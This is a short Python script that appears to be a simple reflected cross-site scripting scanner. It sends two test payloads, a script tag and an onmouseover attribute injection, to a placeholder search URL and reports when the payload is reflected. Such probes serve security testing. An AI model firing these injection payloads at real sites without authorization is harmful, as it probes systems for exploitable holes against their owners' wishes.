import requests

url = "http://example.com/search.php?q="
payloads = ["<script>alert(1)</script>", "\" onmouseover=alert(1)"]

for payload in payloads:
    full_url = url + payload
    res = requests.get(full_url)
    if payload in res.text:
        print(f"[!] Possible XSS: {full_url}")
